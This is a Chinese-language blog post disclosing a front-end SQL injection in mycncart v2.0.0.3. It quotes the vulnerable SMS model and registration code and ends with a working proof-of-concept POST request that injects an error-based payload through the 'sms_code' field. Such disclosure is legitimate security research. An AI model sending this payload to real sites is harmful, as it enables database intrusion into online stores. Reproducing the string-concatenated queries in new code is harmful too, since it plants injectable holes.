---
title: mycncart sqli
tags: 
 - 漏洞分析
categories: codereview
date: 2019-02-25 18:33:48
---

# mycncart v2.0.0.3 前台注入

## CMS相关信息
版本：v2.0.0.3
源码下载：[](https://github.com/mycncart/mycncart/archive/mycncart-2.0.0.3.zip)
mycncart为中国版的opencart电商系统

## 漏洞分析

#### 先决条件：网站开启手机短信功能
一般的电商系统都会有手机短信验证码功能，所以mycncart提供了这个接口。首先先开启该功能
位于后台>扩展功能>扩展功能，筛选出短信网关，并开启，内容可以随便填

#### 源码分析

先直接来看漏洞成因处
v2.0.0.3/catalog/model/account/smsmobile.php
```php
<?php
class ModelAccountSmsMobile extends Model {

  public function addSmsMobile($telephone, $verify_code) {
    $this->db->query("INSERT INTO " . DB_PREFIX . "sms_mobile SET sms_mobile = '" . $telephone . "', verify_code = '" . $verify_code . "'");

  }

  public function editSmsMobile($sms_mobile_id, $telephone, $verify_code) {
    $this->db->query("UPDATE " . DB_PREFIX . "sms_mobile SET sms_mobile = '" . $telephone . "', verify_code = '" . $verify_code . "' WHERE sms_mobile_id = '" . $sms_mobile_id . "'");

  }

  public function deleteSmsMobile($sms_mobile) {
    $this->db->query("DELETE FROM " . DB_PREFIX . "sms_mobile WHERE sms_mobile = '" . $sms_mobile . "'");
  }

  public function getIdBySmsMobile($sms_mobile) {
    $query = $this->db->query("SELECT * FROM " . DB_PREFIX . "sms_mobile WHERE sms_mobile = '" . $sms_mobile . "'");


    return $query->row;
  }

  public function verifySmsCode($sms_mobile, $sms_code) {
    $query = $this->db->query("SELECT COUNT(*) AS total FROM " . DB_PREFIX . "sms_mobile WHERE sms_mobile = '" . $sms_mobile . "' AND verify_code = '" . $sms_code . "'");

    return $query->row['total'];
  }

}
```
该文件为model类，处理短信的相关数据库操作，可以看到这里的所有sql语句都是没有进行安全过滤的，直接就进行拼接
所以如果上层调用不对数据做处理的话，就能造成sql注入
我这里直接找了verifySmsCode这个函数，在前台就能调用到
定位到v2.0.0.3/catalog/controller/account/register.php
```php
public function index() {
      :
      :
    if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
      $customer_id = $this->model_account_customer->addCustomer($this->request->post, $weixin_login_openid, $weixin_login_unionid);
      :
      :
    }
  }
```
省略无关代码，定位到validata()函数
```php
private function validate() {

  if ($this->request->post['registertype'] == 'email') {
    :
    :
  } else {

    if ((utf8_strlen($this->request->post['telephone']) < 3) || (utf8_strlen($this->request->post['telephone']) > 32)) {
      $this->error['telephone'] = $this->language->get('error_telephone');
    }else{

      if ($this->model_account_customer->getTotalCustomersByTelephone(trim($this->request->post['telephone']))) {
        $this->error['telephone'] = $this->language->get('error_telephone_exists');
      } else {

        // if sms code is not correct
        if ($this->config->get('sms_' . $this->config->get('config_sms') . '_status') && in_array('register', (array)$this->config->get('config_sms_page'))) {
          $this->load->model('account/smsmobile');
          if($this->model_account_smsmobile->verifySmsCode($this->request->post['telephone'], $this->request->post['sms_code']) == 0) {
            $this->error['sms_code'] = $this->language->get('error_sms_code');
          }
        }
    :
    :
```
第19行处调用了verifySmsCode函数，其中输入为`$this->request->post['telephone']`,而从`v2.0.0.3/system/library/request.php`的定义可以看到，该cms对数据输入只做了`htmlspecialchars`处理，而这个函数遗漏了单引号的转义，所以根据上面的分析，verifySmsCode函数的第一个参数未做到安全的处理，可以导致注入漏洞的产生

#### PoC

造成数据库错误
```
POST /index.php?route=account/register HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------7517053542655893771289640773
Content-Length: 1491
Connection: close
Cookie: OCSESSID=10ac6e7a3c082a8ce1a8facbbd; language=zh-cn; currency=CNY
Upgrade-Insecure-Requests: 1

-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="registertype"

mobile
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="email"


-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="telephone"

534f3c824a9d63a8
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="sms_code"

' or (select if(0,1,~0+1)) and ''='
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="firstname"

123123
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="lastname"


-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="customer_group_id"

1
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="password"

123123
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="confirm"

123123
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="newsletter"

0
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="captcha"

4a6b2c
-----------------------------7517053542655893771289640773
Content-Disposition: form-data; name="agree"

1
-----------------------------7517053542655893771289640773--
```


